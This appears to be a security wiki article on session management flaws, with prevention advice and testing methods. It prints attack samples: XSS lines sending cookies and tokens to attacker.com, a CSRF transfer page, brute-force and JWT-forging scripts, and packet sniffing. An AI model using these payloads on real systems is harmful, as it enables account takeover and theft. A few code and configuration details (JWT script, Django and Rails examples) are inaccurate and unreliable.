---
title: Session Management Weaknesses
---

# Session Management Weaknesses

Session Management is a critical security mechanism that maintains user state across multiple HTTP requests in stateless web applications. Vulnerabilities in session management occur when applications fail to properly generate, protect, transmit, validate, or invalidate session identifiers, allowing attackers to hijack legitimate user sessions, impersonate users, or bypass authentication entirely. These weaknesses enable unauthorized access to user accounts, sensitive data theft, privilege escalation, and complete account takeover without needing valid credentials.

### Why Sessions Are Required

HTTP is a **stateless protocol**, meaning each request is independent and the server does not remember previous requests from the same client. Session management allows applications to associate multiple requests with the same authenticated user.

## Types of Session Management Vulnerabilities

### 1. Session Fixation

- Attacker forces a known session ID onto a victim's browser before authentication
- Victim authenticates using the attacker-controlled session ID
- Application fails to regenerate session ID after successful login
- Attacker uses the pre-set session ID to hijack the authenticated session

**Example:**

```jsx
# Attacker sends victim a link with predetermined session ID
https://target.com/login?PHPSESSID=attacker_controlled_session_123

# Victim logs in using this session
# Application doesn't regenerate session ID
# Attacker uses same session ID to access victim's account
```

### 2. Session Hijacking (Sidejacking)

- Attacker intercepts or steals a valid session token
- Common methods: network sniffing, XSS, malware, physical access
- Attacker replays the stolen token to impersonate the victim
- Works when sessions transmitted over unencrypted connections or tokens stored insecurely

**Example:**

```jsx
# Session transmitted over HTTP (unencrypted)
GET /dashboard HTTP/1.1
Cookie: session_id=valid_user_session_abc123

# Attacker intercepts on public WiFi
# Replays the cookie to access victim's account
```

### 3. Predictable Session IDs

- Application generates session tokens using weak or predictable algorithms
- Attacker analyzes pattern in session ID generation
- Predicts or brute-forces valid session tokens
- Gains unauthorized access without credentials

**Example:**

```jsx
# Sequential session IDs
User1: SESSION=1000001
User2: SESSION=1000002
User3: SESSION=1000003

# Timestamp-based sessions
SESSION=20260407143000_user123

# Attacker predicts next valid session
```

### 4. Insufficient Session Expiration

- Sessions remain valid indefinitely or for excessive periods
- No automatic logout after inactivity
- Tokens not invalidated after logout, updating critical information like changing password, updating 2FA
- Enables attacks on abandoned sessions, shared computers, or stolen credentials

**Example:**

```jsx
# Session never expires
User logs in → Session created
User closes browser → Session still valid
Days later → Session still active
Attacker finds old session → Full access
```

### 5. Session Token Exposure

- Session IDs leaked through URLs, logs, referrer headers, or error messages
- Tokens stored in browser history, server logs, or third-party analytics
- Session IDs visible in GET parameters instead of cookies
- Enables token theft through various information disclosure vectors

**Example:**

```jsx
# Session ID in URL
https://bank.com/account?session=abc123xyz

# Leaked in Referer header when clicking external links
Referer: https://bank.com/account?session=abc123xyz

# Stored in browser history and server access logs
```

### 6. Insecure Session Storage

- Session tokens stored in localStorage or sessionStorage (accessible via JavaScript)
- Cookies without HttpOnly flag vulnerable to XSS theft
- Session data stored client-side without encryption
- Enables token theft through XSS or malicious scripts

**Example:**

```jsx
// Vulnerable - stored in localStorage
localStorage.setItem('session_token', 'abc123xyz');

// Attacker XSS payload
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('session_token'));
</script>
```

### 7. Concurrent Session Abuse

- Application allows unlimited simultaneous sessions per user
- No detection or prevention of multiple active sessions
- Enables credential sharing, account selling, or undetected compromise
- Legitimate user unaware their account is being accessed elsewhere

**Example:**

```jsx
# Same user logged in from multiple locations simultaneously
Session1: New York - Desktop
Session2: Moscow - Mobile
Session3: London - Tablet

# No alerts, no session limits, no detection
```

---

## Attack Surfaces

### Cookie-Based Sessions

Session tokens transmitted via HTTP cookies are the most common implementation.

**Vulnerable patterns:**

- Cookies without Secure flag transmitted over HTTP
- Cookies without HttpOnly flag accessible via JavaScript
- Cookies without SameSite attribute vulnerable to CSRF
- Overly broad cookie scope (Domain/Path attributes)
- Long-lived persistent cookies for sensitive applications

### URL-Based Session Tokens

Session IDs passed as URL parameters instead of cookies.

**Vulnerable patterns:**

- Session ID in query strings (`?session=abc123`)
- Session ID in URL path (`/app/abc123/dashboard`)
- Tokens visible in browser history
- Leaked via Referer header to external sites
- Stored in server access logs and proxy logs

### Token-Based Authentication (JWT, Bearer Tokens)

APIs using JSON Web Tokens or bearer tokens for session management.

**Vulnerable patterns:**

- Tokens stored in localStorage (XSS vulnerable)
- No token expiration or excessively long lifetime
- Weak signing algorithms (HS256 with weak secret, none algorithm)
- Missing token revocation mechanism
- Tokens transmitted over unencrypted connections

### Single Sign-On (SSO) Sessions

Applications using OAuth, SAML, or OpenID Connect for authentication.

**Vulnerable patterns:**

- Missing state parameter in OAuth flows (CSRF)
- Open redirect vulnerabilities in redirect_uri
- Token leakage through URL fragments
- Insufficient validation of SAML assertions
- Session fixation in SSO implementation

### Session State in Hidden Fields

Legacy applications storing session state in HTML hidden fields.

**Vulnerable patterns:**

- Session data in hidden form fields
- Client-side session state manipulation
- Lack of cryptographic signing
- Sensitive data exposed in HTML source
- No server-side validation of session state

### WebSocket Sessions

Real-time applications using WebSocket connections with session management.

**Vulnerable patterns:**

- Missing authentication on WebSocket handshake
- Session tokens passed in WebSocket URL
- No re-authentication for sensitive WebSocket operations
- CSRF on WebSocket upgrade request
- Session not invalidated when WebSocket closes

---

## Exploitation and Attack Techniques

### Session Fixation Attack

**Methodology:**

```jsx
1. Attacker obtains valid session ID from target application
2. Forces victim to authenticate using this session ID
3. Victim logs in successfully
4. Application fails to regenerate session ID
5. Attacker uses original session ID to access victim's account
```

**Exploitation:**

```jsx
<!-- Method 1: URL parameter injection -->
<a href="https://target.com/login?PHPSESSID=attacker_session_123">
  Click here to login
</a>

<!-- Method 2: Cookie injection via XSS -->
<script>
  document.cookie = "session_id=attacker_session_123; domain=.target.com";
  location.href = "https://target.com/login";
</script>

<!-- Method 3: Meta tag injection -->
<meta http-equiv="Set-Cookie" content="session_id=attacker_session_123">
```

### Session Hijacking via XSS

**Exploitation:**

```jsx
// Steal session cookie via XSS
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Steal session from localStorage
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
</script>

// Exfiltrate session via image request
<script>
  new Image().src = 'https://attacker.com/log?c=' + document.cookie;
</script>
```

### Session Prediction Attack

**Methodology:**

```jsx
import requests
import time

# Collect multiple session IDs
sessions = []
for i in range(100):
    r = requests.get('https://target.com/login')
    session_id = r.cookies.get('SESSIONID')
    sessions.append(session_id)
    time.sleep(0.1)

# Analyze pattern
for sid in sessions:
    print(f"Session: {sid}")
    # Look for sequential, timestamp-based, or predictable patterns

# Predict next valid session
# Try predicted sessions for unauthorized access
```

### Brute Force Session Tokens

**Exploitation:**

```jsx
import requests
import string
import itertools

# For short or weak session tokens
def brute_force_session(url, token_length):
    chars = string.ascii_letters + string.digits
    
    for attempt in itertools.product(chars, repeat=token_length):
        session_token = ''.join(attempt)
        cookies = {'session_id': session_token}
        
        r = requests.get(url, cookies=cookies)
        if "Welcome" in r.text:  # Successful session
            print(f"Valid session found: {session_token}")
            return session_token
```

### Session Replay Attack

**Exploitation:**

```jsx
# Capture valid session
curl -i https://target.com/dashboard \
  -H "Cookie: session=abc123xyz"

# Wait for user to logout
# Replay the same session
curl -i https://target.com/dashboard \
  -H "Cookie: session=abc123xyz"

# If session not properly invalidated, access granted
```

### CSRF Attack

**Exploitation:**

```jsx
<!-- Malicious page hosted on attacker.com -->
<!DOCTYPE html>
<html>
<body>
  <h1>You've won a prize!</h1>
  
  <!-- Hidden form auto-submits using victim's session -->
  <form id="csrf" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
  
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

### JWT Token Manipulation

**Algorithm Confusion Attack:**

```jsx
import jwt
import base64
# Original JWT (signed with HS256)
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.signature"
# Decode without verification
decoded = jwt.decode(token, options={"verify_signature": False})
# Modify payload 
decoded['role'] = 'admin'
# Re-encode with "none" algorithm
header = {"alg": "none", "typ": "JWT"}
payload = decoded
# Create malicious token
malicious_token = base64.urlsafe_b64encode(json.dumps(header).encode()) + "." + \
                  base64.urlsafe_b64encode(json.dumps(payload).encode()) + "."
```

**JWT Signature Bypass:**

```jsx
# Change algorithm from RS256 to HS256
# Server might verify using public key as HMAC secret

# Original header
{"alg": "RS256", "typ": "JWT"}

# Modified header
{"alg": "HS256", "typ": "JWT"}

# Sign with public key (if accessible)
```

### Cookie Tossing Attack

**Exploitation:**

```jsx
// Attacker controls subdomain: evil.target.com
// Set cookie for parent domain
document.cookie = "session=attacker_session; domain=.target.com; path=/";

// When victim visits www.target.com
// Browser sends both cookies
// If app uses first cookie received, attacker's cookie wins
```

### Session Donation Attack

**Exploitation:**

```jsx
1. Attacker creates account on target site
2. Attacker authenticates and obtains valid session
3. Attacker forces victim to use this session (session fixation)
4. Victim performs actions thinking they're anonymous
5. Attacker logs into their own account
6. Sees victim's actions/data associated with attacker's account
```

---

## Advanced Attack Scenarios

### 1. Session Hijacking via Network Sniffing

**Scenario:**

Public WiFi network without encryption allows packet sniffing to capture session cookies transmitted over HTTP.

**Attack Flow:**

```jsx
# Attacker sets up packet capture on public WiFi
sudo tcpdump -i wlan0 -A | grep "Cookie:"

# Victim browses http://insecure-site.com
# Attacker captures session cookie

# Attacker replays cookie
curl https://insecure-site.com/account \
  -H "Cookie: session_id=captured_session_123"
```

---

### 2. Session Fixation in OAuth Flow

**Scenario:**

Application doesn't regenerate session after OAuth authentication, allowing attacker to pre-set session before victim authenticates.

**Attack Flow:**

```jsx
1. Attacker visits: https://target.com/
   Gets session: SESSION=attacker_123
2. Attacker crafts OAuth link with fixed session:
   https://target.com/oauth/login?session=attacker_123
3. Victim clicks link and authenticates via OAuth
4. Application associates OAuth account with attacker_123 session
5. Attacker uses attacker_123 to access victim's account
```

---

### 3. JWT None Algorithm Attack

**Scenario:**

Application accepts JWT tokens with "none" algorithm, allowing unsigned token creation.

**Exploitation:**

```jsx
import base64
import json
# Create unsigned JWT
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "administrator"}
# Base64 encode
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
# Create token (no signature)
malicious_jwt = f"{header_b64}.{payload_b64}."
# Use token
# Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.
```

---

### 4. Race Condition in Session Validation

**Scenario:**

Application has race condition between session validation and session invalidation during logout.

**Exploitation:**

```jsx
import requests
import threading
session_cookie = "session=valid_session_123"
def logout():
    requests.get('https://target.com/logout', headers={'Cookie': session_cookie})
def access_protected():
    r = requests.get('https://target.com/admin', headers={'Cookie': session_cookie})
    if "Admin Panel" in r.text:
        print("Race condition exploited! Access granted after logout")
# Start logout
logout_thread = threading.Thread(target=logout)
logout_thread.start()
# Immediately try to access protected resource
for i in range(100):
    threading.Thread(target=access_protected).start()
```

---

### 5. Session Hijacking via Subdomain Takeover

**Scenario:**

Attacker takes over abandoned subdomain and uses it to set cookies for parent domain.

**Attack Flow:**

```jsx
1. Find abandoned subdomain: old.target.com (CNAME points to deleted cloud service)
2. Attacker claims the cloud service
3. Attacker hosts malicious page on old.target.com
4. Attacker sets cookie for parent domain:
   document.cookie = "session=attacker_session; domain=.target.com"
5. Victim visits www.target.com
6. Application receives attacker's session cookie
7. Session fixation achieved
```

---

### 6. Mobile App Session Persistence Attack

**Scenario:**

Mobile app stores session tokens in insecure storage, allowing extraction from rooted/jailbroken device or backup.

**Exploitation:**

```jsx
# Android - Extract session from app storage
adb shell
su
cd /data/data/com.vulnerable.app/shared_prefs/
cat app_preferences.xml
# Find session token
<string name="auth_token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</string>
# Use token in API requests
curl https://api.app.com/user/profile \
  -H "Authorization: Bearer extracted_token_here"
```

---

### 7. Cross-Site Session Transfer

**Scenario:**

Application accepts session cookies from different origins due to misconfigured CORS or domain settings.

**Exploitation:**

```jsx
// Attacker's page on evil.com
fetch('https://target.com/api/user', {
  method: 'GET',
  credentials: 'include',  // Include cookies
  headers: {
    'Content-Type': 'application/json'
  }
})
.then(response => response.json())
.then(data => {
  // Send stolen data to attacker
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

---

### 8. Session Fixation via Cookie Injection in Shared Hosting

**Scenario:**

Multiple applications share same domain, attacker uses one vulnerable app to set cookies affecting other apps.

**Attack Flow:**

```jsx
1. vulnerable-app.example.com allows cookie injection
2. secure-app.example.com shares domain
3. Attacker injects cookie via vulnerable app:
   https://vulnerable-app.example.com/xss?payload=<script>document.cookie="SESSION=attacker_123;domain=.example.com"</script>
4. Cookie set for entire .example.com domain
5. Victim visits secure-app.example.com with attacker's session
6. Victim authenticates using attacker's pre-set session
```

---

### 9. GraphQL Session Enumeration

**Scenario:**

GraphQL API allows session enumeration through introspection or unprotected queries.

**Exploitation:**

```jsx
# Query to enumerate active sessions
query {
  sessions {
    id
    userId
    createdAt
    lastActive
    ipAddress
  }
}
# Query specific session details
query {
  session(id: "abc123") {
    userId
    permissions
    userData {
      email
      name
    }
  }
} 
```

---

### 10. Session Confusion in Multi-Tenant Applications

**Scenario:**

Multi-tenant SaaS application fails to properly isolate sessions between tenants.

**Attack Flow:**

```jsx
1. Attacker creates account in Tenant A
2. Obtains valid session: SESSION_A=xyz789
3. Modifies session cookie or request:
   Cookie: SESSION_A=xyz789; tenant_id=TENANT_B
4. Application processes request in context of Tenant B
5. Attacker accesses Tenant B data using Tenant A session
```

## Framework-Specific Vulnerabilities

### 1. PHP Session Management

**Default session.cookie_httponly = false:**

```jsx
// Vulnerable - cookies accessible via JavaScript
session_start();
$_SESSION['user_id'] = $user_id;
// XSS can steal session
<script>alert(document.cookie)</script>
```

**Session ID in URL:**

```jsx
// Vulnerable - exposes session in URL
ini_set('session.use_trans_sid', 1);
// Results in: page.php?PHPSESSID=abc123
```

---

### 2. Java/JSP Sessions

**Session fixation if not regenerated:**

```jsx
// Vulnerable - doesn't regenerate session after login
HttpSession session = request.getSession();
session.setAttribute("user", authenticatedUser);
// Should invalidate old session and create new one
session.invalidate();
HttpSession newSession = request.getSession(true);
```

---

### 3. Node.js/Express Sessions

**Insecure session defaults:**

```jsx
// Vulnerable - weak secret, no secure flag
app.use(session({
  secret: 'keyboard cat',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false }  // Allows HTTP transmission
}));
```

---

### 4. Django Sessions

**Session data stored in cookies without signing:**

```jsx
# settings.py - Vulnerable
SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'
SECRET_KEY = 'weak_secret'  # Weak secret allows tampering
# Attacker can decode, modify, and re-encode session data
```

---

### 5. Ruby on Rails

**Session secret exposed in repository:**

```jsx
# config/secrets.yml committed to Git
production:
  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
# If secret leaked, attacker can forge sessions
```

---

### 6. ASP.NET

**Missing session timeout configuration:**

```jsx
<!-- web.config - Vulnerable -->
<sessionState timeout="999999" />
<!-- Sessions never expire -->
```

---

## Detection Techniques

### Manual Testing Methodology

**1. Session Token Analysis:**

```jsx
# Collect multiple session tokens
for i in {1..50}; do
  curl -i https://target.com/login -d "user=test&pass=test" | grep Set-Cookie
done
# Analyze for:
# - Length and entropy
# - Sequential patterns
# - Timestamp-based patterns
# - Predictable components
```

**2. Cookie Security Attributes:**

```jsx
# Check cookie flags
curl -i https://target.com/login -d "credentials"
# Look for missing attributes:
Set-Cookie: session=abc123
# Missing: Secure, HttpOnly, SameSite
```

**3. Session Fixation Testing:**

```jsx
# Get session before login
curl -i https://target.com/ 
# Set-Cookie: SESSIONID=before_auth_123
# Login with this session
curl -i https://target.com/login \
  -d "username=user&password=pass" \
  -H "Cookie: SESSIONID=before_auth_123"
# Check if session ID changed
# If same ID after login = vulnerable to session fixation
```

**4. Session Expiration Testing:**

```jsx
# Login and capture session
curl -i https://target.com/login -d "user=test&pass=test"
# Note session cookie
# Wait (or don't) and try accessing protected resource
curl https://target.com/dashboard \
  -H "Cookie: session=captured_session"
# If still works after logout = insufficient invalidation
```

**5. CSRF Token Validation:**

```jsx
# Make request without CSRF token
curl -X POST https://target.com/transfer \
  -H "Cookie: session=valid_session" \
  -d "to=attacker&amount=1000"
# If succeeds = missing CSRF protection
```

---

### Automated Testing Methodology

**1. Burp Suite Session Analysis:**

```jsx
1. Proxy traffic through Burp
2. Spider application while authenticated
3. Use Sequencer to analyze session token randomness
4. Check for session fixation in login flow
5. Test CSRF protection on state-changing requests
```

**2. OWASP ZAP Session Testing:**

```jsx
# Start ZAP proxy
zap.sh -daemon -port 8080
# Run session management scan
zap-cli quick-scan https://target.com
# Check for:
# - Weak session tokens
# - Missing secure flags
# - Session fixation
```

**3. Custom Python Script:**

Performs automated checks for common session management vulnerabilities.

```jsx
import requests
import re

def test_session_security(url):

    # Sends an initial request to obtain a pre-authentication session cookie.
    r1 = requests.get(url)

    # Extracts the session cookie issued before login.
    initial_session = r1.cookies.get('session')

    # Performs login while reusing the same pre-authentication session cookie.
    # This checks whether the application regenerates the session ID after authentication.
    r2 = requests.post(
        f"{url}/login",
        data={'user': 'test', 'pass': 'test'},
        cookies={'session': initial_session}
    )

    # Retrieves the session cookie returned after successful login.
    post_login_session = r2.cookies.get('session')

    # If the session ID remains unchanged after login,
    # the application may be vulnerable to Session Fixation.
    if initial_session == post_login_session:
        print("[!] Session Fixation vulnerability found")

    # Examine all cookies returned by the server.
    for cookie in r2.cookies:

        # Check whether the Secure flag is present.
        # Without it, the cookie may be transmitted over unencrypted HTTP.
        if not cookie.secure:
            print(f"[!] Cookie {cookie.name} missing Secure flag")

        # Check whether the HttpOnly flag is present.
        # Without it, JavaScript can access the cookie, increasing XSS impact.
        if not cookie.has_nonstandard_attr('HttpOnly'):
            print(f"[!] Cookie {cookie.name} missing HttpOnly flag")
```

**4. JWT Tool (Burp Extension)**

```
1. Decode the JWT to inspect header and payload.
2. Modify claims (sub, role, userId, permissions) and re-sign if applicable.
3. Test alg:none and algorithm confusion attacks.
4. Modify exp, iat, and nbf claims to verify validation.
5. Test kid, jku, and jwk header injection attacks.
```

---

### Session Token Entropy Analysis

**Using Burp Sequencer:**

```jsx
1. Capture session creation requests
2. Send to Sequencer
3. Collect 10,000+ tokens
4. Analyze results:
   - Overall entropy
   - Character-level analysis
   - Bit-level analysis
   - Correlation analysis
```

**Manual Statistical Analysis:**

This script calculates the Shannon entropy of a collection of session tokens to estimate how random and unpredictable they are. In session management testing, low entropy can indicate weak or predictable session IDs, which may be vulnerable to guessing or brute-force attacks.

```jsx
import math
from collections import Counter
def calculate_entropy(tokens):
    # Analyze session token randomness
    all_chars = ''.join(tokens)
    char_freq = Counter(all_chars)
    entropy = 0
    for count in char_freq.values():
        probability = count / len(all_chars)
        entropy -= probability * math.log2(probability)
    print(f"Shannon Entropy: {entropy:.2f} bits")  
    # Good session tokens should have high entropy (>4.0 bits per character)
    if entropy < 4.0:
        print("[!] Low entropy detected - tokens may be predictable")
```

---

## Impact

- Hijacking a valid session allows an attacker to access a user's account without knowing their credentials, enabling them to view sensitive information, modify account settings, and perform actions as the legitimate user.
- Session fixation can lead to complete account takeover when the application fails to issue a new session identifier after successful authentication.
- Predictable or weak session identifiers may allow attackers to guess or brute-force valid sessions, resulting in unauthorized access to multiple user accounts.
- Exposed session tokens in URLs, logs, browser history, or referrer headers can be reused by attackers to impersonate authenticated users.
- Weak session handling can enable unauthorized financial transactions, password changes, profile modifications, or other sensitive actions on behalf of the victim.
- Insecure cookie configurations or session sharing across subdomains can allow attackers to compromise multiple applications within the same domain.
- Failure to properly invalidate sessions after logout or password changes allows stolen session tokens to remain usable, increasing the risk of persistent unauthorized access.
- Compromise of privileged or administrator sessions can result in privilege escalation, unauthorized administrative actions, and complete control over the application.
- Successful session attacks can expose sensitive user and business data, leading to privacy violations, regulatory compliance issues, and reputational damage.
- Large-scale exploitation of session management flaws can result in widespread account compromise, affecting multiple users without requiring credential theft.

---

## Prevention

- Regenerate session ID after authentication — call `session_regenerate_id(true)` in PHP, `session.invalidate()` in Java, `session.regenerateId()` in Express immediately after login.
- Set all session cookie security flags — `Secure` for HTTPS-only, `HttpOnly` to block JavaScript access, `SameSite=Strict` to prevent CSRF attacks.
- Implement idle timeout — 15 minutes of inactivity logs user out automatically, shorter for banking/healthcare applications.
- Never pass session IDs in URLs — always use HTTP-only cookies, reject any session ID passed as GET parameter.
- Implement CSRF tokens on all state-changing requests — unique per-request token, validate on server-side before processing, reject requests without valid token.
- Invalidate sessions on logout — delete server-side session data, clear session cookie, add to revocation list if using JWTs.
- Bind sessions to additional factors — IP address (with caution for mobile), User-Agent string, device fingerprint to detect session hijacking attempts.
- Implement concurrent session limits — allow maximum 3 simultaneous sessions, notify user of new logins, provide session management dashboard.
- Implement session fixation protection — reject session IDs from external sources, only accept server-generated session IDs, regenerate after privilege changes.
- Set proper cookie scope — `Path=/app` limits to application, avoid `Domain=.example.com` unless necessary, minimize cookie exposure.
- Use JWT securely if stateless — sign with RS256, set short expiration (15 minutes), implement token refresh mechanism, maintain revocation list.

---

## Tools

| **Tool** | **Purpose** |
| --- | --- |
| [Burp Suite Sequencer](https://portswigger.net/burp/documentation/desktop/tools/sequencer) | Session token entropy analysis |
| [OWASP ZAP](https://www.zaproxy.org/) | Session management vulnerability scanning |
| [Cookie-Editor](https://github.com/Moustachauve/cookie-editor) | Browser extension for cookie manipulation |
| [JWT_Tool](https://github.com/ticarpi/jwt_tool) | JWT security testing and exploitation |
| [sessionprobe](https://github.com/dnet/sessionprobe) | Session security testing toolkit |
| [Wireshark](https://www.wireshark.org/) | Network traffic analysis for session sniffing |
| [Fiddler](https://www.telerik.com/fiddler) | HTTP/HTTPS traffic inspection |
| [mitmproxy](https://mitmproxy.org/) | Interactive HTTPS proxy for session analysis |
| [Cookie Cadger](https://cookiecadger.com/) | Session hijacking and sidejacking tool |
| [Firesheep](https://github.com/codebutler/firesheep) | Session hijacking demonstration tool |
| [Hamster & Ferret](http://hamster.erratasec.com/) | Sidejacking and session hijacking suite |
| [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) | Out-of-band session token leakage detection |

---

## Good to Read

- [Auth0 - Session Management Best Practices](https://auth0.com/docs/manage-users/sessions)
- [HackerOne Report #716576](https://hackerone.com/reports/716576) - Session Fixation in OAuth
- [HackerOne Report #895727](https://hackerone.com/reports/895727) - JWT None Algorithm Vulnerability
- [PortSwigger Research - JWT Attack Techniques](https://portswigger.net/web-security/jwt)
- [OWASP ASVS Session Requirements](https://github.com/OWASP/ASVS/raw/v5.0.0/5.0/OWASP_Application_Security_Verification_Standard_5.0.0_en.pdf)
- [NIST 800-63B Session Management](https://pages.nist.gov/800-63-4/sp800-63b/session/)

## References

- [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/README](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/README)
- [https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [https://portswigger.net/web-security/authentication](https://portswigger.net/web-security/authentication)
- [https://portswigger.net/web-security/authentication/securing](https://portswigger.net/web-security/authentication/securing)
- [https://owasp.org/www-community/attacks/Session_fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)